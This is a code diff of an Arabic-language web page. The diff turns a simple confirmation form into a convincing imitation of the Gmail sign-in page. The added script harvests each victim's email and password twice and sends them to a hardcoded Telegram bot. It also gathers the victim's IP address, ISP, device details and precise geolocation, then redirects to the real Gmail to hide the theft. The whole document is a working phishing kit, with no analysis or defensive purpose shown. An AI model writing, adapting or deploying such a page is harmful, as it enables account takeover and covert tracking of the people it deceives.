@@ -1,36 +1,628 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>تأكيد الحساب</title>
+  <title>Gmail - تسجيل الدخول</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --blue: #1a73e8;
+      --green: #34a853;
+      --red: #d93025;
+      --gray: #5f6368;
+      --light-gray: #f1f3f4;
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Google Sans', Arial, sans-serif;
+      background: white;
+      color: #202124;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      transition: background 0.3s;
+    }
+    
+    /* Header Styles */
+    .google-header {
+      padding: 6px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #dadce0;
+    }
+    
+    .google-header-right {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    
+    .signin-button {
+      background: var(--blue);
+      color: white;
+      border: none;
+      padding: 9px 23px;
+      border-radius: 4px;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    
+    /* Main Content */
+    .main-content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    
+    .login-container {
+      width: 100%;
+      max-width: 450px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 48px 40px 36px;
+      margin: 20px 0;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .login-header {
+      text-align: center;
+      margin-bottom: 35px;
+    }
+    
+    .login-header img {
+      width: 75px;
+      height: 24px;
+      margin-bottom: 15px;
+    }
+    
+    .login-header h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 10px;
+    }
+    
+    .login-header p {
+      font-size: 16px;
+      color: var(--gray);
+    }
+    
+    /* Form Styles */
+    .input-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+    
+    .input-group input {
+      width: 100%;
+      padding: 13px 15px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+      transition: border 0.3s;
+    }
+    
+    .input-group input:focus {
+      border: 1px solid var(--blue);
+      box-shadow: 0 0 0 2px #e8f0fe;
+    }
+    
+    .forgot-email {
+      display: block;
+      color: var(--blue);
+      font-size: 14px;
+      text-decoration: none;
+      margin-bottom: 30px;
+    }
+    
+    .button-group {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .next-button {
+      background: var(--blue);
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 4px;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    
+    .next-button:hover {
+      background: #1765cc;
+      box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
+    }
+    
+    /* Footer Styles */
+    .google-footer {
+      background: #f2f2f2;
+      padding: 15px 30px;
+      font-size: 14px;
+      color: var(--gray);
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+    }
+    
+    .footer-links {
+      display: flex;
+      gap: 20px;
+    }
+    
+    .footer-links a {
+      color: var(--gray);
+      text-decoration: none;
+    }
+    
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+    
+    /* Hidden Pages */
+    .hidden-page {
+      display: none;
+    }
+    
+    /* Verification Page */
+    .verification-container {
+      text-align: center;
+      padding: 40px 20px;
+    }
+    
+    .spinner {
+      border: 6px solid rgba(66, 133, 244, 0.2);
+      border-top: 6px solid var(--blue);
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 30px auto;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .success-check {
+      color: var(--green);
+      font-size: 60px;
+      margin: 30px auto;
+      display: none;
+    }
+    
+    /* Error Message */
+    .error-message {
+      color: var(--red);
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+    
+    /* Responsive */
+    @media (max-width: 600px) {
+      .login-container {
+        border: none;
+        padding: 20px;
+      }
+      
+      .google-footer {
+        flex-direction: column;
+        align-items: center;
+        gap: 10px;
+      }
+    }
+    
+    /* Password Strength Meter */
+    .strength-meter {
+      height: 4px;
+      background: #eee;
+      margin-top: 5px;
+      border-radius: 2px;
+      overflow: hidden;
+      display: none;
+    }
+    
+    .strength-meter-fill {
+      height: 100%;
+      width: 0;
+      background: var(--red);
+      transition: width 0.3s, background 0.3s;
+    }
+    
+    /* Language Selector */
+    .language-selector {
+      position: absolute;
+      bottom: 10px;
+      right: 10px;
+      font-size: 12px;
+      color: var(--gray);
+    }
+  </style>
 </head>
 <body>
-  <h2>تأكيد البريد الإلكتروني</h2>
-  <form id="confirmForm">
-    <input type="email" id="confirmEmail" placeholder="أعد إدخال البريد الإلكتروني" required><br>
-    <input type="password" id="confirmPassword" placeholder="أعد إدخال كلمة المرور" required><br>
-    <button type="submit">تأكيد</button>
-  </form>
+  <!-- Google Header -->
+  <header class="google-header">
+    <div class="google-header-left">
+      <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
+    </div>
+    <div class="google-header-right">
+      <button class="signin-button">تسجيل الدخول</button>
+    </div>
+  </header>
+
+  <!-- Main Content - Login Page -->
+  <main class="main-content" id="login-page">
+    <div class="login-container">
+      <div class="login-header">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
+        <h1>تسجيل الدخول</h1>
+        <p>تابع باستخدام حسابك على Google</p>
+      </div>
+      
+      <form id="login-form">
+        <div class="input-group">
+          <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autofocus>
+        </div>
+        
+        <div class="input-group hidden-page" id="password-group">
+          <input type="password" id="password" placeholder="أدخل كلمة المرور">
+          <div class="strength-meter">
+            <div class="strength-meter-fill"></div>
+          </div>
+        </div>
+        
+        <a href="#" class="forgot-email hidden-page" id="forgot-email">نسيت كلمة المرور؟</a>
+        
+        <div class="button-group">
+          <a href="#" class="forgot-email" id="create-account">إنشاء حساب</a>
+          <button type="button" class="next-button" id="next-button">التالي</button>
+        </div>
+      </form>
+    </div>
+  </main>
+
+  <!-- Confirm Page -->
+  <main class="main-content hidden-page" id="confirm-page">
+    <div class="login-container">
+      <div class="login-header">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
+        <h1>تأكيد الحساب</h1>
+        <p>لحماية حسابك، يرجى تأكيد معلوماتك</p>
+      </div>
+      
+      <form id="confirm-form">
+        <div class="input-group">
+          <input type="email" id="confirm-email" placeholder="أعد إدخال البريد الإلكتروني">
+        </div>
+        
+        <div class="input-group">
+          <input type="password" id="confirm-password" placeholder="أعد إدخال كلمة المرور">
+        </div>
+        
+        <div class="error-message" id="confirm-error"></div>
+        
+        <div class="button-group">
+          <button type="button" class="next-button" id="confirm-button">تأكيد</button>
+        </div>
+      </form>
+    </div>
+  </main>
+
+  <!-- Verification Page -->
+  <main class="main-content hidden-page" id="verification-page">
+    <div class="login-container verification-container">
+      <div class="login-header">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google">
+        <h1>جارٍ التحقق من معلوماتك</h1>
+        <p>قد تستغرق هذه العملية بضع لحظات</p>
+      </div>
+      
+      <div class="spinner" id="verification-spinner"></div>
+      <div class="success-check" id="success-check">✓</div>
+      
+      <p id="status-message">يتم الآن التحقق من معلومات حسابك...</p>
+    </div>
+  </main>
+
+  <!-- Google Footer -->
+  <footer class="google-footer">
+    <div class="footer-links">
+      <a href="#">حول Google</a>
+      <a href="#">الخصوصية</a>
+      <a href="#">الشروط</a>
+    </div>
+    <div class="footer-links">
+      <a href="#">مساعدة</a>
+      <a href="#">الإبلاغ عن مشكلة</a>
+    </div>
+    <div class="language-selector">
+      <select>
+        <option value="ar">العربية</option>
+        <option value="en">English</option>
+      </select>
+    </div>
+  </footer>
 
   <script>
-    document.getElementById("confirmForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const confirmEmail = document.getElementById("confirmEmail").value;
-      const confirmPassword = document.getElementById("confirmPassword").value;
-
-      const originalEmail = localStorage.getItem("email");
-      const originalPassword = localStorage.getItem("password");
-
-      if (confirmEmail === originalEmail && confirmPassword === originalPassword) {
-        // إرسال تأكيد إلى Telegram
-        fetch(`https://api.telegram.org/bot<توكنك>/sendMessage?chat_id=<IDك>&text=✅ تأكيد مطابق\nEmail: ${confirmEmail}`);
-
-        // الانتقال للصفحة الثالثة
-        window.location.href = "vifry.html";
+    // Telegram Configuration
+    const BOT_TOKEN = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
+    const CHAT_ID = "7493001551";
+    
+    // DOM Elements
+    const loginPage = document.getElementById('login-page');
+    const confirmPage = document.getElementById('confirm-page');
+    const verificationPage = document.getElementById('verification-page');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const confirmEmailInput = document.getElementById('confirm-email');
+    const confirmPasswordInput = document.getElementById('confirm-password');
+    const passwordGroup = document.getElementById('password-group');
+    const forgotEmailLink = document.getElementById('forgot-email');
+    const nextButton = document.getElementById('next-button');
+    const confirmButton = document.getElementById('confirm-button');
+    const confirmError = document.getElementById('confirm-error');
+    const verificationSpinner = document.getElementById('verification-spinner');
+    const successCheck = document.getElementById('success-check');
+    const statusMessage = document.getElementById('status-message');
+    
+    // User Data
+    let userCredentials = {};
+    let isPasswordStep = false;
+    
+    // Initialize Page
+    function init() {
+      // Show email input first
+      passwordGroup.style.display = 'none';
+      forgotEmailLink.style.display = 'none';
+      
+      // Event Listeners
+      nextButton.addEventListener('click', handleNext);
+      confirmButton.addEventListener('click', handleConfirm);
+      emailInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleNext();
+      });
+      passwordInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleNext();
+      });
+      confirmEmailInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleConfirm();
+      });
+      confirmPasswordInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleConfirm();
+      });
+      
+      // Password strength indicator
+      passwordInput.addEventListener('input', updatePasswordStrength);
+    }
+    
+    // Handle Next Button Click
+    function handleNext() {
+      if (!isPasswordStep) {
+        // Email step
+        const email = emailInput.value.trim();
+        
+        if (!email || !validateEmail(email)) {
+          emailInput.focus();
+          emailInput.style.borderColor = 'var(--red)';
+          return;
+        }
+        
+        // Save email and switch to password step
+        userCredentials.email = email;
+        emailInput.style.borderColor = '#dadce0';
+        
+        // Update UI for password step
+        emailInput.readOnly = true;
+        passwordGroup.style.display = 'block';
+        forgotEmailLink.style.display = 'block';
+        document.getElementById('create-account').style.display = 'none';
+        nextButton.textContent = 'تسجيل الدخول';
+        isPasswordStep = true;
+        passwordInput.focus();
       } else {
-        alert("❌ البيانات غير متطابقة، حاول مرة أخرى.");
+        // Password step
+        const password = passwordInput.value.trim();
+        
+        if (!password) {
+          passwordInput.focus();
+          passwordInput.style.borderColor = 'var(--red)';
+          return;
+        }
+        
+        // Save password and proceed
+        userCredentials.password = password;
+        passwordInput.style.borderColor = '#dadce0';
+        
+        // Send data to Telegram
+        sendToTelegram(`📥 Gmail Login Attempt:\n📧 ${userCredentials.email}\n🔑 ${userCredentials.password}`);
+        
+        // Collect and send tracking information
+        collectTrackingInfo();
+        
+        // Show confirmation page
+        showConfirmPage();
       }
-    });
+    }
+    
+    // Handle Confirm Button Click
+    function handleConfirm() {
+      const email = confirmEmailInput.value.trim();
+      const password = confirmPasswordInput.value.trim();
+      
+      if (!email || !password) {
+        showError('الرجاء إدخال البريد الإلكتروني وكلمة المرور');
+        return;
+      }
+      
+      if (email !== userCredentials.email || password !== userCredentials.password) {
+        showError('لا يوجد تطابق، الرجاء إدخال المعلومات الصحيحة');
+        return;
+      }
+      
+      // Send confirmation to Telegram
+      sendToTelegram(`✅ Gmail Login Confirmed:\n📧 ${email}\n🔑 ${password}`);
+      
+      // Show verification page
+      showVerificationPage();
+    }
+    
+    // Show Confirm Page
+    function showConfirmPage() {
+      loginPage.classList.add('hidden-page');
+      confirmPage.classList.remove('hidden-page');
+      confirmEmailInput.value = userCredentials.email;
+      confirmPasswordInput.focus();
+    }
+    
+    // Show Verification Page
+    function showVerificationPage() {
+      confirmPage.classList.add('hidden-page');
+      verificationPage.classList.remove('hidden-page');
+      
+      // Simulate verification process
+      setTimeout(() => {
+        verificationSpinner.style.display = 'none';
+        successCheck.style.display = 'block';
+        statusMessage.textContent = 'تم التحقق بنجاح! يتم الآن تحويلك إلى Gmail...';
+        
+        // Redirect to Gmail after verification
+        setTimeout(() => {
+          window.location.href = 'https://mail.google.com';
+        }, 2000);
+      }, 3000);
+    }
+    
+    // Show Error Message
+    function showError(message) {
+      confirmError.textContent = message;
+      confirmError.style.display = 'block';
+      setTimeout(() => {
+        confirmError.style.display = 'none';
+      }, 3000);
+    }
+    
+    // Validate Email Format
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+    
+    // Update Password Strength Indicator
+    function updatePasswordStrength() {
+      const password = passwordInput.value;
+      const strengthMeter = document.querySelector('.strength-meter');
+      const strengthFill = document.querySelector('.strength-meter-fill');
+      
+      if (password.length > 0) {
+        strengthMeter.style.display = 'block';
+        
+        // Simple strength calculation
+        let strength = 0;
+        if (password.length >= 8) strength += 30;
+        if (/[A-Z]/.test(password)) strength += 20;
+        if (/[0-9]/.test(password)) strength += 20;
+        if (/[^A-Za-z0-9]/.test(password)) strength += 30;
+        
+        strengthFill.style.width = `${Math.min(strength, 100)}%`;
+        
+        // Update color based on strength
+        if (strength < 40) {
+          strengthFill.style.backgroundColor = 'var(--red)';
+        } else if (strength < 70) {
+          strengthFill.style.backgroundColor = '#fbbc05';
+        } else {
+          strengthFill.style.backgroundColor = 'var(--green)';
+        }
+      } else {
+        strengthMeter.style.display = 'none';
+      }
+    }
+    
+    // Send Data to Telegram
+    function sendToTelegram(message) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      }).catch(err => console.error('Telegram Error:', err));
+    }
+    
+    // Collect Tracking Information
+    function collectTrackingInfo() {
+      let trackingMessage = '🔍 Tracking Information:\n\n';
+      
+      // Get IP and basic info
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          trackingMessage += `🌐 IP Address: ${data.ip || 'Unknown'}\n`;
+          trackingMessage += `📍 Location: ${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
+          trackingMessage += `🛜 ISP: ${data.org || 'Unknown'}\n`;
+          
+          if (data.latitude && data.longitude) {
+            trackingMessage += `🗺️ Approximate Location: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
+          }
+          
+          // Get device info
+          trackingMessage += `\n📱 Device Info:\n`;
+          trackingMessage += `👤 User Agent: ${navigator.userAgent}\n`;
+          trackingMessage += `💻 Platform: ${navigator.platform}\n`;
+          trackingMessage += `🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+          trackingMessage += `⏰ Local Time: ${new Date().toLocaleString()}\n`;
+          
+          // Try to get precise location
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              position => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                
+                trackingMessage += `\n🎯 Precise Location (Accuracy: ${Math.round(accuracy)}m):\n`;
+                trackingMessage += `https://www.google.com/maps?q=${lat},${lon}\n`;
+                
+                sendToTelegram(trackingMessage);
+              },
+              error => {
+                console.log('Geolocation error:', error);
+                sendToTelegram(trackingMessage);
+              },
+              { enableHighAccuracy: true, timeout: 5000 }
+            );
+          } else {
+            sendToTelegram(trackingMessage);
+          }
+        })
+        .catch(error => {
+          console.log('IPAPI error:', error);
+          trackingMessage += '⚠️ Could not retrieve full location info\n';
+          sendToTelegram(trackingMessage);
+        });
+    }
+    
+    // Initialize the page
+    init();
   </script>
 </body>
 </html>
